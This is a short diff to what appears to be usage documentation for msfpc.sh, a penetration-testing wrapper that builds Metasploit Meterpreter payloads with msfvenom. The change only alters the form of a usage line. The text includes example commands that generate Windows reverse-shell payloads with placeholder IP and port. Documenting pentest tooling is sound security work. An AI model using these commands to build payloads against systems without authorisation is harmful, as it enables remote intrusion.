@@ -410,7 +410,7 @@ various "basic" Meterpreter payloads via msfvenom:
    + Tomcat [.war]
    + Windows [.exe // .exe // .dll]
 
-./msfpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
+msfpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
 
 msfpc.sh Windows <IP> <PORT> CMD REVERSE STAGELESS TCP
 msfpc.sh Windows <IP> <PORT> MSF REVERSE STAGED TCP
